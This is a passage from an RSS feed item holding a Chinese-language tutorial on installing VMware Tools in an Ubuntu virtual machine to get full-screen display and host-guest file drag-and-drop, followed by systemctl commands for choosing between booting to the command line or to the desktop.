&lt;/code>&lt;/pre>
&lt;p>cdrom图标。&lt;/p>
&lt;pre>&lt;code>1.2 复制 VMwareTools-10.0.10-4301679.tar.gz（版本根据自己的实际情况） 到/home/lance/目录下。 用命令【tar -xzvf VMwareTools-10.0.10-4301679.tar.gz】解压。
1.3 解压后 cd vmware_tools_distrib，打开终端
1.4 输入“sudo ./vmware-install.pl”，输入用户密码便可开始安装了。
1.5 接下来N多的enter，N多的YES，自己慢慢按吧。
1.6 直到你看到—the vmware team 后 reboot 重启即可
1.7 若还没有全屏显示，则将虚拟机的【查看】-&amp;gt;【自动调整大小】-&amp;gt;【自适应客户机】,都选上。即可实现全屏。
1.8 安装vmware tools实现全屏后，即也实现了在主机（WIN7）和虚拟机VMware （ubuntu）间直接拖拽文件。
&lt;/code>&lt;/pre>
&lt;p>enjoy yourself&lt;/p>
&lt;p>Ubuntu 16.04 执行下面命令默认启动到命令行：
$ sudo systemctl set-default multi-user.target
执行如下命令启动到桌面：
$ sudo systemctl start lightdm&lt;/p></description></item></channel></rss>